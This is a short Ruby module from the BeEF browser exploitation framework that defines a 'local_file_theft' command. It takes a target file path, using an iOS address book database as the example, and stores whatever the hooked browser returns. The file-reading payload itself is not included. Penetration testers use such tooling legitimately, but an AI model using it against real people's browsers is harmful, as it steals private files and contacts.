#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
# local_file_theft
#
# Shamelessly plagurised from kos.io/xsspwn

class Local_file_theft < BeEF::Core::Command

  def self.options
    return [
        {'name' => 'target_file', 
         'description' => 'The full path to the local file to steal e.g. file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb', 
         'ui_label' => 'Target file',
         'value' => 'autodetect'
         } 
    ]
  end
 
   def post_execute
    content = {}
    content['result'] = @datastore['result']
    save content
  end 
  
end
